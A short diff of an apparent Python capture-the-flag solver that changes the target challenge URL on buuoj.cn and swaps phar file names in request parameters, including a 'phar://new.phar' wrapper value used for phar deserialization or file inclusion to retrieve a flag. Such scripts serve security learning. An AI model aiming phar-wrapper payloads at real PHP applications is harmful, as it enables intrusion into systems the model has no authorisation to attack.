@@ -5,8 +5,8 @@ import re
 import requests
 
 pattern = r'flag\{.+?\}'
-url = "http://71e7dc79-25d8-4434-930b-dd532ec9ae49.node4.buuoj.cn:81/"  # 替换为题目靶机地址
-params = {'pear': '1.phar', 'apple': 'phar://1.phar'}
+url = "http://2f780076-ee66-4a7f-9f82-6b5305bd8ab0.node4.buuoj.cn:81/"  # 替换为题目靶机地址
+params = {'pear': 'new.phar', 'apple': 'phar://new.phar'}
 if os.path.exists(r'd:\XAM\htdocs\learn\Websecuritylearning\Python\Script\1.phar'):
     with open(r'd:\XAM\htdocs\learn\Websecuritylearning\Python\Script\1.phar', 'rb') as file:
         f = file.read()
